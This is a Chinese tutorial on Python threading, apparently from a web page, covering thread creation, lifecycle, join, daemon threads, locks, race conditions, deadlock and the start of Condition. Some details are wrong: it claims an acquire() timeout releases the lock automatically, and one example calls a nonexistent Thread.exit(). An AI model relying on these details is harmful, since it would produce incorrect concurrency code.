程序可以通过setName(name)方法为线程设置名字,也可以通过geName()方法返回指定线程的名字,这两个方法可通过name属性来代替
主线程实例的名字叫MainThread,子线程的名字在创建时指定,名字仅仅在打印时用来显示,完全没有其他意义,如果不起名字Python就自动给线程命名为Thread-1,Thread-2

</pre>通过Thread类的构造器来创建线程对象,在进行多线程编程时Python程序运行时默认的主线程<textarea>
import threading

# 定义一个普通的action函数,该函数准备作为线程执行体
def action(max):
    for i in range(max):
        print(threading.current_thread().getName() +  " " + str(i))

# 下面是主程序(也就是主线程的执行体)
for i in range(100):
    print(threading.current_thread().getName() +  " " + str(i))
    if i == 20:
        # 创建并启动第一个线程
        t1 = threading.Thread(target=action,args=(100,))
        t1.start()
        # 创建并启动第二个线程
        t2 =threading.Thread(target=action,args=(100,))
        t2.start()

print('主线程执行完成!')

</textarea><pre>
主程序包含一个循环,当循环变量i等于20时创建并启动两个新线程,再加上主线程总计有3个线程,主线程的线程执行体就是程序中的主程序,没有放在任何函数中的代码,这三个线程的执行没有先后顺序,它们以并发方式执行:Thread-1执行一段时间,然后可能Thread-2或MainThread获得CPU执行一段时间,接下来又换其他线程执行,这就是典型的线程并发执行,CPU以快速轮换的方式在多个线程之间切换,从而给用户一种错觉,即多个线程似乎同时在执行
如果不使用多线程,主程序直接调用两次action()函数,那么程序必须等第一次调用的action()函数执行完成才会执行第二次调用的action()函数;必须等第二次调用的action()函数执行完成,才会继续向下执行主程序。
而使用多线程之后,程序可以让两个action()函数、主程序以并发方式执行,给用户一种错觉,两个action()函数和主程序似乎同时在执行。

</pre><textarea>
# 启动一个线程就是把一个函数传入并创建Thread实例,然后调用start()开始执行
import time, threading

# 新线程执行的函数代码
def loop():
    print('thread %s is running...' % threading.current_thread().name)
    n = 0
    while n < 5:
        n = n + 1
        print('thread %s >>> %s' % (threading.current_thread().name, n))
        time.sleep(1)
    print('thread %s ended.' % threading.current_thread().name)

print('thread %s is running...' % threading.current_thread().name)
t = threading.Thread(target=loop, name='LoopThread')
t.start()
t.join()
print('thread %s ended.' % threading.current_thread().name)

# 执行结果如下:
thread MainThread is running...
thread LoopThread is running...
thread LoopThread >>> 1
thread LoopThread >>> 2
thread LoopThread >>> 3
thread LoopThread >>> 4
thread LoopThread >>> 5
thread LoopThread ended.
thread MainThread ended.

</textarea><pre>
2、继承threading模块的Thread类创建线程类
通过继承Thread类来创建并启动线程的步骤如下:
1、定义Thread类的子类,并重写该类的run()方法,run()方法的方法体就代表了线程需要完成的任务,因此把run()方法称为线程执行体。
2、创建Thread子类的实例,即创建线程对象。
3、调用线程对象的start()方法来启动线程。

</pre><textarea>
import threading

# 通过继承threading.Thread类来创建线程类
class FkThread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.i = 0
    # 重写run()方法作为线程执行体
    def run(self):
        while self.i < 100:
            print(threading.current_thread().getName() +  " " + str(self.i))
            self.i += 1

# 下面是主程序(也就是主线程的执行体)
for i in range(100):
    print(threading.current_thread().getName() +  " " + str(i))
    if i == 20:
        # 创建并启动第一个线程
        ft1 = FkThread()
        ft1.start()
        # 创建并启动第二个线程
        ft2 = FkThread()
        ft2.start()
print('主线程执行完成!')

</textarea>使用threading模块创建线程,直接从threading.Thread继承,然后重写__init__方法和run方法<textarea>
import threading
import time

exitFlag = 0

class myThread (threading.Thread):   #继承父类threading.Thread
    def __init__(self, threadID, name, counter):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
    def run(self):                   #把要执行的代码写到run函数里面 线程在创建后会直接运行run函数
        print("Starting " + self.name)
        print_time(self.name, self.counter, 5)
        print("Exiting " + self.name)

def print_time(threadName, delay, counter):
    while counter:
        if exitFlag:
            (threading.Thread).exit()
        time.sleep(delay)
        print("%s: %s" % (threadName, time.ctime(time.time())))
        counter -= 1

# 创建新线程
thread1 = myThread(1, "Thread-1", 1)
thread2 = myThread(2, "Thread-2", 2)

# 开启线程
thread1.start()
thread2.start()

print("Exiting Main Thread")

</textarea><pre>
【 Python线程的生命周期(新建、就绪、运行、阻塞和死亡) 】
当线程被创建并启动以后,它既不是一启动就进入执行状态的,也不是一直处于执行状态的,在线程的生命周期中它要经过新建(new)、就绪(Ready)、运行(Running)、阻塞(Blocked)和死亡(Dead)5种状态。
尤其是当线程启动以后,它不可能一直霸占着CPU独自运行,所以CPU需要在多个线程之间切换,于是线程状态也会多次在运行、就绪之间转换

线程的新建和就绪状态
当程序创建了一个Thread对象或Thread子类的对象之后,该线程就处于新建状态,和其他的Python对象一样,此时的线程对象并没有表现出任何线程的动态特征,程序也不会执行线程执行体。
当线程对象调用start()方法之后,该线程处于就绪状态,Python解释器会为其创建方法调用栈和程序计数器,处于这种状态中的线程并没有开始运行,只是表示该线程可以运行了,等待运行。至于该线程何时开始运行,取决于Python解释器中线程调度器的调度

启动线程使用start()方法,而不是run()方法。调用start()方法来启动线程,系统会把该run()方法当成线程执行体来处理;但如果直接调用线程对象的run()方法则run()方法立即就会被执行,而且在该方法返回之前其他线程无法并发执行。也就是说,如果直接调用线程对象的run()方法,则系统把线程对象当成一个普通对象,而run()方法也是一个普通方法,而不是线程执行体
在调用线程对象的run()方法之后,该线程己经不再处于新建状态,不要再次调用线程对象的start()方法
只能对处于新建状态的线程调用start()方法,即如果程序对同一个线程重复调用start()方法将引发RuntimeError异常

</pre><textarea>
import threading
# 定义准备作为线程执行体的action函数
def action(max):
    for i in range(max):
        # 直接调用run()方法时,Thread的name属性返回的是该对象的名字而不是当前线程的名字
        # 使用threading.current_thread().name总是获取当前线程的名字
        print(threading.current_thread().name +  " " + str(i))

for i in range(100):
    # 调用Thread的currentThread()方法获取当前线程
    print(threading.current_thread().name +  " " + str(i))
    if i == 20:
        # 直接调用线程对象的run()方法,系统会把线程对象当成普通对象,把run()方法当成普通方法,所以下面两行代码并不会启动两个线程,而是整个程序只有一个主线程依次执行两个run()方法,变成单线程程序了
        threading.Thread(target=action,args=(100,)).run()
        threading.Thread(target=action,args=(100,)).run()

</textarea><pre>
线程的运行和阻塞状态
如果处于就绪状态的线程获得了CPU,开始执行run()方法的线程执行体,则该线程处于运行状态。

如果计算机只有一个CPU,那么在任何时刻只有一个线程处于运行状态。当然在一个具有多处理器的机器上将会有多个线程并行(Parallel)执行;当线程数大于处理器数时,依然会存在多个线程在同一个CPU上轮换的情况。

当一个线程开始运行后,它不可能一直处于运行状态(除非它的线程执行体足够短,瞬间就执行结束了),线程在运行过程中需要被中断,目的是使其他线程获得执行的机会,线程调度的细节取决于底层平台所采用的策略。对于采用抢占式调度策略的系统而言,系统会给每一个可执行的线程一个小时间段来处理任务;当该时间段用完后,系统就会剥夺该线程所占用的资源,让其他线程获得执行的机会。在选择下一个线程时,系统会考虑线程的优先级。

所有现代的桌面和服务器操作系统都采用抢占式调度策略,但一些小型设备如手机等则可能采用协作式调度策略,在这样的系统中只有当一个线程调用了它的sleep()或yield()方法后才会放弃其所占用的资源,也就是必须由该线程主动放弃其所占用的资源

当发生如下情况时线程将会进入阻塞状态:
线程调用sleep()方法主动放弃其所占用的处理器资源。
线程调用了一个阻塞式I/O方法,在该方法返回之前该线程被阻塞。
线程试图获得一个锁对象,但该锁对象正被其他线程所持有
线程在等待某个通知(Notify)。

当前正在执行的线程被阻塞之后,其他线程就可以获得执行的机会。被阻塞的线程会在合适的时候重新进入就绪状态,而不是运行状态。也就是说被阻塞线程的阻塞解除后,必须重新等待线程调度器再次调度它。

针对上面几种情况,当发生如下特定的情况时可以解除阻塞,让该线程重新进入就绪状态:
1、调用sleep()方法的线程经过了指定的时间。
2、线程调用的阻塞式I/O方法己经返回。
3、线程成功地获得了试图获取的锁对象。
4、线程正在等待某个通知时,其他线程发出了一个通知。

线程从阻塞状态只能进入就绪状态,无法直接进入运行状态。就绪和运行状态之间的转换通常不受程序控制,而是由系统线程调度所决定的,当处于就绪状态的线程获得处理器资源时,该线程进入运行状态;当处于运行状态的线程失去处理器资源时,该线程进入就绪状态

线程死亡
线程会以如下方式结束,结束后就处于死亡状态:
1、run()方法或代表线程执行体的target函数执行完成,线程正常结束。
2、线程抛出一个未捕获的Exception或Error。

当主线程结束时,其他线程不受任何影响,并不会随之结束。一旦子线程启动起来后,它就拥有和主线程相同的地位,不会受主线程的影响

为了测试某个线程是否己经死亡,可以调用线程对象的is_alive()方法,当线程处于就绪、运行、阻塞三种状态时该方法将返回True;当线程处于新建、死亡两种状态时该方法将返回False

不要试图对一个已经死亡状态的线程调用start()方法使它重新启动,该线程将不可再次作为线程运行,将引发RuntimeError异常
程序只能对处于新建状态的线程调用start()方法,对于处于新建状态的线程两次调用start()方法也是错误的,它们都会引发RuntimeError异常

</pre><pre>
【 Thread.join() 】
Thread提供了让一个线程等待另一个线程完成的join()方法。当在程序执行流中调用其他线程的join()方法时,调用线程将被阻塞,直到被join()方法加入的join线程执行完成。join()方法通常由使用线程的程序调用,以将大问题划分成许多小问题,并为每个小问题分配一个线程。当所有的小问题都得到处理后,再调用主线程来进一步操作
join(timeout=None)可设置timeout参数指定等待被join的线程的时间最长为timeout秒,在timeout秒内被join的线程还没有执行结束则不再等待

</pre><textarea>
import threading
# 定义action函数准备作为线程执行体使用
def action(max):
    for i in range(max):
        print(threading.current_thread().name + " " + str(i))

# 启动子线程
threading.Thread(target=action, args=(10,), name="新线程").start()

for i in range(10):
    if i == 5:
        jt = threading.Thread(target=action, args=(10,), name="被Join的线程")
        jt.start()
        jt.join()  # 主线程调用了jt线程的join()方法,主线程必须等jt执行结束才会向下执行
    print(threading.current_thread().name + " " + str(i))

'''
一共有三个线程,主程序开始时就启动了名为"新线程"的子线程,该子线程将会和主线程并发执行。当主线程的循环变量i等于20时,启动了名为"被Join的线程"的线程,该线程会和"新线程"并发执行,但不会和主线程并发执行,主线程处于阻塞等待状态,主线程必须等该线程执行结束后才可以向下执行
'''

</textarea><pre>
【 守护线程 】
有一种线程是在后台运行的,它的任务是为其他线程提供服务,这种线程被称为"后台线程(Daemon Thread)",又称为"守护线程"或"精灵线程"。Python解释器的垃圾回收线程就是典型的后台线程。
后台线程有一个特征,如果所有的前台线程都死亡了,那么后台线程会自动死亡,此外与普通线程无异

调用Thread对象的daemon属性可以将指定线程设置成后台线程

主线程默认是前台线程,主线程创建的子线程默认也是前台线程。但并不是所有的线程默认都是前台线程,有些线程默认就是后台线程。前台线程创建的子线程默认是前台线程,后台线程创建的子线程默认是后台线程。

可见创建后台线程有两种方式:
1、主动将线程的daemon属性设置为True。
2、后台线程启动的线程默认是后台线程。

当前台线程死亡后,Python解释器会通知后台线程死亡,但从它接收指令到做出响应需要一定的时间。如果要将某个线程设置为后台线程,则必须在该线程启动之前进行设置。也就是说将daemon属性设为True必须在start()方法调用之前进行,否则会引发RuntimeError异常。

</pre>将指定线程设置成后台线程,可以看到当所有的前台线程都死亡后,后台线程随之死亡。当在整个虚拟机中只剩下后台线程时,程序就没有继续运行的必要了,所以程序也就退出了<textarea>
import threading

# 定义后台线程的线程执行体与普通线程没有任何区别
def action(max):
    for i in range(max):
        print(threading.current_thread().name + "  " + str(i))

t = threading.Thread(target=action, args=(100,), name='后台线程')
t.daemon = True  # 将此线程设置成后台线程,也可在创建Thread对象时通过daemon参数将其设为后台线程
t.start()        # 启动后台线程
for i in range(10):
    print(threading.current_thread().name + "  " + str(i))
# -----程序执行到此处,前台线程(主线程)结束------
# 后台线程也应该随之结束

</textarea><pre>
【 time.sleep函数用法:线程睡眠,强制线程调度切换 】
如果需要让当前正在执行的线程暂停一段时间,并进入阻塞状态,则可以通过调用time模块的sleep(secs)函数来实现。该函数可指定一个secs参数,用于指定线程阻塞多少秒。

当前线程调用sleep()函数进入阻塞状态后,在其睡眠时间段内,该线程不会获得执行的机会,即使系统中没有其他可执行的线程,处于sleep()中的线程也不会执行,因此sleep()函数常用来暂停程序的运行

</pre>调用sleep()函数来暂停主线程的执行1s,因为该程序只有一个主线程,当主线程进入睡眠后,系统没有可执行的线程,所以可以看到程序在sleep()函数处暂停,程序依次输出10个字符串,输出两个字符串的时间间隔为1s<textarea>
import time
for i in range(10):
    print("当前时间: %s" % time.ctime())
    # 调用sleep()函数让当前线程暂停1s
    time.sleep(1)

</textarea><pre>
【 线程安全 线程同步 同步锁Lock 线程锁 】
多线程编程是一件有趣的事情,它很容易突然出现"错误情况",这是由系统的线程调度具有一定的随机性造成的。不过,即使程序偶然出现问题,那也是由于编程不当引起的。当使用多个线程来访问同一个数据时,很容易"偶然"出现线程安全问题

如果有多个线程同时操作一个对象,如果没有很好地保护该对象会造成程序结果的不可预期,比如一个print语句只打印出一半的字符,这个线程就被暂停,执行另一个去了,所以看到的结果会很乱,这种现象叫做"线程不安全"

多线程和多进程最大的不同在于,多进程中同一个变量各自有一份拷贝存在于每个进程中,互不影响,而多线程中所有变量都由所有线程共享,所以任何一个变量都可以被任何一个线程修改,因此线程之间共享数据最大的危险在于多个线程同时改一个变量,把内容给改乱了。如果多个线程共同对某个数据修改,则可能出现不可预料的结果,为了保证数据的正确性,需要对多个线程进行同步。

多线程的优势在于可以同时运行多个任务,但当线程需要共享数据时可能存在数据不同步的问题。
考虑这样一种情况:一个列表里所有元素都是0,线程"set"从后向前把所有元素改成1,而线程"print"负责从前往后读取列表并打印。
那么可能线程"set"开始改的时候线程"print"便来打印列表了,输出就成了一半0一半1,这就是数据的不同步。为了避免这种情况,引入了锁的概念。

锁有两种状态:锁定和未锁定。每当一个线程比如"set"要访问共享数据时,必须先获得锁定;如果已经有别的线程比如"print"获得锁定了,那么就让线程"set"暂停,也就是同步阻塞;等到线程"print"访问完毕,释放锁以后再让线程"set"继续。经过这样的处理,打印列表时要么全部输出0,要么全部输出1,不会再出现一半0一半1的尴尬场面。

有一个经典的"银行取钱"问题。从银行取钱的基本流程基本上可以分为如下几个步骤:
用户输入账户、密码,系统判断用户的账户、密码是否匹配。
用户输入取款金额。
系统判断账户余额是否大于取款金额。
如果余额大于取款金额,则取款成功;如果余额小于取款金额,则取款失败。

乍一看上去,这确实就是日常生活中的取款流程,这个流程没有任何问题。但一旦将这个流程放在多线程并发的场景下,就有可能出现问题,此处说的是有可能,并不是说一定。也许程序运行了一百万次都没有出现问题,但没有出现问题并不等于没有问题

</pre>按照上面的流程编写取款程序,使用两个线程来模拟两个人使用同一个账户并发取钱操作<textarea>
import threading, time

# 账户类
class Account:
    def __init__(self, account_no, balance):
        # 封装账户编号、账户余额的两个成员变量
        self.account_no = account_no
        self.balance = balance

# 定义一个函数来模拟取钱操作
def draw(account, draw_amount):
    if account.balance >= draw_amount:
        print(threading.current_thread().name + "取款成功！取款金额:" + str(draw_amount))
        # time.sleep(0.001)
        account.balance -= draw_amount  # 修改余额
        print("账户余额为: " + str(account.balance))
    else:
        print(threading.current_thread().name + "取款失败！余额不足！")

# 创建一个账户
acct = Account("1234567" , 1000)
# 模拟两个线程对同一个账户取钱
threading.Thread(name='甲', target=draw , args=(acct, 800)).start()
threading.Thread(name='乙', target=draw , args=(acct, 800)).start()

'''
$ ./hello.py
甲取款成功！取款金额:800
账户余额为: 200
乙取款成功！取款金额:800
账户余额为: -600
$ ./hello.py
甲取款成功！取款金额:800
账户余额为: 200
乙取款失败！余额不足！
'''

</textarea><pre>
运行结果并不是银行所期望的结果,不过有可能看到正确的运行结果,这正是多线程编程突然出现的"偶然"错误因为线程调度的不确定性。

假设系统线程调度器在注释代码处暂停,让另一个线程执行(为了强制暂停,只要取消程序中注释代码前的注释即可)。取消注释后,再次运行程序,将总可以看到余额为负数的错误结果。

问题出现了,账户余额只有1000元时取出了1600元,而且账户余额出现了负值,远不是银行所期望的结果。虽然上面程序是人为地使用time.sleep(0.001)来强制线程调度切换,但这种切换也是完全可能发生的,100000次操作只要有1次出现了错误,那就是由编程错误引起的

同步锁(Lock)
出现如上的错误结果是因为run()方法的方法体不具有线程安全性,程序中有两个并发线程在修改Account对象,而且系统恰好在注释代码处执行线程切换,切换到另一个修改Account对象的线程,所以就出现了问题。

为了解决这个问题,Python的threading模块引入了锁Lock。threading模块提供了Lock和RLock两个类,在实现线程安全的控制中比较常用的是RLock,它们都提供了如下两个方法来加锁和释放锁:
acquire(blocking=True, timeout=-1):请求对Lock或RLock加锁,其中timeout参数指定加锁多少秒。
release():释放锁。

Lock和RLock的区别:
threading.Lock:它是一个基本的锁对象,每次只能锁定一次,其余的锁请求,需等待锁释放后才能获取。
threading.RLock:它代表可重入锁(Reentrant Lock)。对于可重入锁,在同一个线程中可以对它进行多次锁定,也可以多次释放。如果使用RLock,那么acquire()和release()方法必须成对出现。如果调用了n次acquire()加锁,则必须调用n次release()才能释放锁。同一个线程可以对已被加锁的RLock锁再次加锁,RLock对象会维持一个计数器来追踪acquire()方法的嵌套调用,线程在每次调用acquire()加锁后都必须显式调用release()方法来释放锁,所以一段被锁保护的方法可以调用另一个被相同锁保护的方法。

Lock是控制多个线程对共享资源进行访问的工具。通常锁提供了对共享资源的独占访问,每次只能有一个线程对Lock对象加锁,线程在开始访问共享资源之前应先请求获得Lock对象。当对共享资源访问完成后,程序释放对Lock对象的锁定。
对于那些需要每次只允许一个线程操作的数据,可以将其操作放到acquire和release方法之间

Threading模块提供了Threading.Lock类,创建一个该类对象,在线程函数执行前"抢占"该锁,执行完成后"释放"该锁,则确保了每次只有一个线程占有该锁。这时候对一个公共的对象进行操作则不会发生线程不安全的现象了。先建立了一个threading.Lock类对象lock,使用lock.acquire()获得了这个锁,此时其他的线程就无法再获得该锁了,他们就会阻塞在"if lock.acquire()"这里,直到锁被另一个线程释放：lock.release()

</pre>使用RLock对象来控制线程安全,当加锁和释放锁出现在不同的作用范围内时,通常建议使用finally块来确保在必要时释放锁<textarea>
class X:
    # 定义需要保证线程安全的方法
    def m () :
        self.lock.acquire()      # 加锁
        try :
            # 需要保证线程安全的代码,方法体
        finally :                # 使用finally块来保证释放锁
            self.lock.release()  # 修改完成,释放锁

</textarea><pre>
通过使用Lock对象可以非常方便地实现线程安全的类,线程安全的类具有如下特征:
1、该类的对象可以被多个线程安全地访问。
2、每个线程在调用该对象的任意方法之后,都将得到正确的结果。
3、每个线程在调用该对象的任意方法之后,该对象都依然保持合理的状态。

总的来说,不可变类总是线程安全的,因为它的对象状态不可改变;但可变对象需要额外的方法来保证其线程安全。例如上面的Account就是一个可变类,它的self.account_no和self._balance两个成员变量都可以被改变,当两个钱程同时修改Account对象的self._balance成员变量的值时,程序就出现了异常。

</pre>将Account类对self.balance的访问设置成线程安全的,那么只需对修改self.balance的方法增加线程安全的控制即可<textarea>
import threading, time

class Account:
    # 定义构造器
    def __init__(self, account_no, balance):
        self.account_no = account_no  # 封装账户编号、账户余额的两个成员变量
        self._balance = balance
        self.lock = threading.RLock() # 定义一个RLock对象
    # 因为账户余额不允许随便修改,所以只为self._balance提供getter方法
    def getBalance(self):
        return self._balance
    # 提供一个线程安全的draw()方法来完成取钱操作
    def draw(self, draw_amount):
        self.lock.acquire()  # 请求对RLock对象加锁
        try:
            if self._balance >= draw_amount:
                print(threading.current_thread().name + "取款成功！取款金额:" + str(draw_amount))
                time.sleep(0.001)
                self._balance -= draw_amount  # 修改余额
                print("账户余额为: " + str(self._balance))
            else:
                print(threading.current_thread().name + "取款失败！余额不足！")
        finally:
            self.lock.release()  # 修改完成,释放锁

# 定义一个函数来模拟取钱操作
def draw(account, draw_amount):
    account.draw(draw_amount)  # 直接调用account对象的draw()方法来执行取钱操作

# 创建一个账户
acct = Account("1234567" , 1000)
# 模拟两个线程对同一个账户取钱
threading.Thread(name='甲', target=draw , args=(acct , 800)).start()
threading.Thread(name='乙', target=draw , args=(acct , 800)).start()

</textarea><pre>
程序中RLock对象作为同步锁,线程每次开始执行draw()方法修改self.balance时都必须先对RLock对象加锁。当该线程完成对self._balance的修改,将要退出draw()方法时则释放对RLock对象的锁定。这样的做法完全符合"加锁→修改→释放锁"的安全访问逻辑。

当一个线程在draw()方法中对RLock对象加锁之后,其他线程由于无法获取对RLock对象的锁定,因此它们同时执行draw()方法对self._balance进行修改。这意味着,并发线程在任意时刻只有一个线程可以进入修改共享资源的代码区(也被称为临界区),所以在同一时刻最多只有一个线程处于临界区内,从而保证了线程安全。

为了保证Lock对象能真正"锁定"它所管理的Account对象,程序会被编写成每个Account对象有一个对应的Lock

上面的Account类增加了一个代表取钱的draw()方法,并使用Lock对象保证该draw()方法的线程安全,而且取消了setBalance()方法(避免程序直接修改self._balance成员变量),因此线程执行体只需调用Account对象的draw()方法即可执行取钱操作

</pre><textarea>
import time, threading
balance = 0  # 银行存款

def change_it(n):
    global balance
    balance = balance + n
    balance = balance - n

def run_thread(n):
    for i in range(100000):
        change_it(n)

t1 = threading.Thread(target=run_thread, args=(5,))
t2 = threading.Thread(target=run_thread, args=(8,))
t1.start()
t2.start()
t1.join()
t2.join()
print(balance)

</textarea><pre>
定义了一个共享变量balance,初始值为0,并且启动两个线程,先存后取,理论上结果应该为0,但由于线程的调度是由操作系统决定的,当t1、t2交替执行时,只要循环次数足够多,balance的结果就不一定是0了。
原因是高级语言的一条语句在CPU执行时是若干条语句,即使一个简单的计算:
balance = balance + n
也分两步:
计算balance + n,存入临时变量中
将临时变量的值赋给balance
也就是可以看成:
x = balance + n
balance = x

由于x是局部变量,两个线程各自都有自己的x,当代码正常执行时:
初始值 balance = 0
t1: x1 = balance + 5 # x1 = 0 + 5 = 5
t1: balance = x1     # balance = 5
t1: x1 = balance - 5 # x1 = 5 - 5 = 0
t1: balance = x1     # balance = 0
t2: x2 = balance + 8 # x2 = 0 + 8 = 8
t2: balance = x2     # balance = 8
t2: x2 = balance - 8 # x2 = 8 - 8 = 0
t2: balance = x2     # balance = 0
结果 balance = 0

但是t1和t2是交替运行的,如果操作系统以下面的顺序执行t1、t2:
初始值 balance = 0
t1: x1 = balance + 5  # x1 = 0 + 5 = 5
t2: x2 = balance + 8  # x2 = 0 + 8 = 8
t2: balance = x2      # balance = 8
t1: balance = x1      # balance = 5
t1: x1 = balance - 5  # x1 = 5 - 5 = 0
t1: balance = x1      # balance = 0
t2: x2 = balance - 8  # x2 = 0 - 8 = -8
t2: balance = x2   # balance = -8
结果 balance = -8

究其原因是因为修改balance需要多条语句,而执行这几条语句时线程可能中断,从而导致多个线程把同一个对象的内容改乱了。
两个线程同时一存一取就可能导致余额不对,所以必须确保一个线程在修改balance的时候别的线程一定不能改。

如果要确保balance计算正确,就要给change_it()上一把锁,当某个线程开始执行change_it()时,该线程因为获得了锁,因此其他线程不能同时执行change_it(),只能等待,直到锁被释放后,获得该锁以后才能改。由于锁只有一个,无论多少线程,同一时刻最多只有一个线程持有该锁,所以不会造成修改的冲突。创建一个锁就是通过threading.Lock()来实现:

</pre><textarea>
balance = 0
lock = threading.Lock()

def run_thread(n):
    for i in range(100000):
        lock.acquire()     # 先要获取锁
        try:
            change_it(n)
        finally:
            lock.release()  # 改完了一定要释放锁

</textarea><pre>
当多个线程同时执行lock.acquire()时,只有一个线程能成功地获取锁,然后继续执行代码,其他线程就继续等待直到获得锁为止。
获得锁的线程用完后一定要释放锁,否则那些苦苦等待锁的线程将永远等待下去,成为死线程,所以用try...finally来确保锁一定会被释放。

锁的好处就是确保了某段关键代码只能由一个线程从头到尾完整地执行,坏处当然也很多,首先是阻止了多线程并发执行,包含锁的某段代码实际上只能以单线程模式执行,效率就大大地下降了。其次由于可以存在多个锁,不同的线程持有不同的锁,并试图获取对方持有的锁时,可能会造成死锁,导致多个线程全部挂起,既不能执行,也无法结束,只能靠操作系统强制终止

</pre><textarea>
import threading
import time

class myThread (threading.Thread):
    def __init__(self, threadID, name, counter):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
    def run(self):
        print("Starting " + self.name)
        threadLock.acquire()  # 获得锁,成功获得锁定后返回True,可选的timeout参数不填时将一直阻塞直到获得锁定,否则超时后将返回False
        print_time(self.name, self.counter, 3)
        threadLock.release()  # 释放锁

def print_time(threadName, delay, counter):
    while counter:
        time.sleep(delay)
        print("%s: %s" % (threadName, time.ctime(time.time())))
        counter -= 1

threadLock = threading.Lock()
threads = []

# 创建新线程
thread1 = myThread(1, "Thread-1", 1)
thread2 = myThread(2, "Thread-2", 2)

# 开启新线程
thread1.start()
thread2.start()

# 添加线程到线程列表
threads.append(thread1)
threads.append(thread2)

# 等待所有线程完成
for t in threads:
    t.join()
print("Exiting Main Thread")

</textarea><pre>
可变类的线程安全是以降低程序的运行效率作为代价的,为了减少线程安全所带来的负面影响,程序可以采用如下策略:
1、不要对线程安全类的所有方法都进行同步,只对那些会改变竞争资源(竞争资源也就是共享资源)的方法进行同步。例如上面Account类中的account_no实例变量就无须同步,所以程序只对draw()方法进行了同步控制。
2、如果可变类有两种运行环境,单线程环境和多线程环境,则应该为该可变类提供两种版本,即线程不安全版本和线程安全版本。在单线程环境中使用钱程不安全版本以保证性能,在多线程环境中使用线程安全版本。

【 线程死锁 】
当两个线程相互等待对方释放同步监视器时就会发生死锁。Python解释器没有监测, 也没有采取措施来处理死锁情况,所以在进行多线程编程时应该采取措施避免出现死锁。
一旦出现死锁,整个程序既不会发生任何异常,也不会给出任何提示,只是所有线程都处于阻塞状态,无法继续。

</pre>死锁是很容易发生的,尤其是在系统中出现多个同步监视器的情况下<textarea>
import threading, time

class A:
    def __init__(self):
        self.lock = threading.RLock()
    def foo(self, b):
        try:
            self.lock.acquire()
            print("当前线程名: " + threading.current_thread().name + " 进入了A实例的foo()方法" )     # ①
            time.sleep(0.2)
            print("当前线程名: " + threading.current_thread().name + " 企图调用B实例的last()方法")   # ③
            b.last()
        finally:
            self.lock.release()
    def last(self):
        try:
            self.lock.acquire()
            print("进入了A类的last()方法内部")
        finally:
            self.lock.release()

class B:
    def __init__(self):
        self.lock = threading.RLock()
    def bar(self, a):
        try:
            self.lock.acquire()
            print("当前线程名: " + threading.current_thread().name + " 进入了B实例的bar()方法" )   # ②
            time.sleep(0.2)
            print("当前线程名: " + threading.current_thread().name + " 企图调用A实例的last()方法")  # ④
            a.last()
        finally:
            self.lock.release()
    def last(self):
        try:
            self.lock.acquire()
            print("进入了B类的last()方法内部")
        finally:
            self.lock.release()

a = A()
b = B()

def init():
    threading.current_thread().name = "主线程"
    a.foo(b)
    print("进入了主线程之后")

def action():
    threading.current_thread().name = "副线程"
    b.bar(a)
    print("进入了副线程之后")

threading.Thread(target=action).start()  # 以action为target启动新线程
init()  # 调用init()函数

</textarea><pre>
程序既无法向下执行,也不会抛出任何异常,就一直"僵持"着。究其原因,是因为上面程序中A对象和B对象的方法都是线程安全的方法。

程序中有两个线程执行,副线程的线程执行体是action()函数,主线程的线程执行体是init()函数(主程序调用了init()函数)。其中在action()函数中让B对象调用bar()方法,而在init()函数中让A对象调用foo()方法。

action()函数先执行,调用了B对象的bar()方法,在进入bar()方法之前该线程对B对象的Lock加锁(当程序执行到②号代码时副线程暂停0.2s);CPU切换到执行另一个线程,让A对象执行foo()方法,所以看到主线程开始执行A实例的foo()方法,在进入foo()方法之前,该线程对A对象的Lock加锁(当程序执行到①号代码时主线程也暂停0.2s)。

接下来副线程会先醒过来,继续向下执行,直到执行到④号代码处希望调用A对象的last()方法(在执行该方法之前必须先对A对象的Lock加锁),但此时主线程正保持着A对象的Lock的锁定,所以副线程被阻塞。

接下来主线程应该也醒过来了,继续向下执行,直到执行到③号代码处希望调用B对象的last()方法(在执行该方法之前必须先对B对象的Lock加锁),但此时副线程没有释放对B对象的Lock的锁定。

至此就出现了主线程保持着A对象的锁,等待对B对象加锁,而副线程保持着B对象的锁,等待对A对象加锁,两个线程互相等待对方先释放锁,所以就出现了死锁。

死锁是不应该在程序中出现的,在编写程序时应该尽量避免出现死锁,几种常见的方式用来解决死锁问题:
1、避免多次锁定。尽量避免同一个线程对多个Lock进行锁定。例如上面的死锁程序,主线程要对A、B两个对象的Lock进行锁定,副线程也要对A、B两个对象的Lock进行锁定,这就埋下了导致死锁的隐患。
2、具有相同的加锁顺序。如果多个线程需要对多个Lock进行锁定则应该保证它们以相同的顺序请求加锁。比如上面的死锁程序,主线程先对A对象的Lock加锁,再对B对象的Lock加锁;而副线程则先对B对象的Lock加锁,再对A对象的Lock加锁。这种加锁顺序很容易形成嵌套锁定,进而导致死锁。如果让主线程、副线程按照相同的顺序加锁就可以避免这个问题。
3、使用定时锁。程序在调用acquire()方法加锁时可指定timeout参数,该参数指定超过timeout秒后会自动释放对Lock的锁定,这样就可以解开死锁了。
4、死锁检测。死锁检测是一种依靠算法机制来实现的死锁预防机制,它主要是针对那些不可能实现按序加锁,也不能使用定时锁的场景的。

</pre><pre>
【 threading.Condition()实现线程通信 】
当线程在系统中运行时,线程的调度具有一定的透明性,通常程序无法准确控制线程的轮换执行,如果有需要,Python可通过线程通信来保证线程协调运行

假设系统中有两个线程,这两个线程分别代表存款者和取钱者,现在假设系统有一种特殊的要求,即要求存款者和取钱者不断地重复存款、取钱的动作,而且要求每当存款者将钱存入指定账户后,取钱者就立即取出该笔钱。不允许存款者连续两次存钱,也不允许取钱者连续两次取钱。

为了实现这种功能,可以借助于Condition对象来保持协调。使用Condition可以让那些己经得到Lock对象却无法继续执行的线程释放Lock对象,Condition对象也可以唤醒其他处于等待状态的线程。

将Condition对象与Lock对象组合使用,可以为每个对象提供多个等待集(wait-set)。因此Condition对象总是需要有对应的Lock对象。从Condition的构造器__init__(self, lock=None)可以看出,程序在创建Condition时可通过lock参数传入要绑定的Lock对象;如果不指定lock参数,在创建Condition时它会自动创建一个与之绑定的Lock对象。

Condition类提供了如下几个方法:
acquire([timeout])/release()
调用Condition关联的Lock的acquire()或release()方法。

wait([timeout])
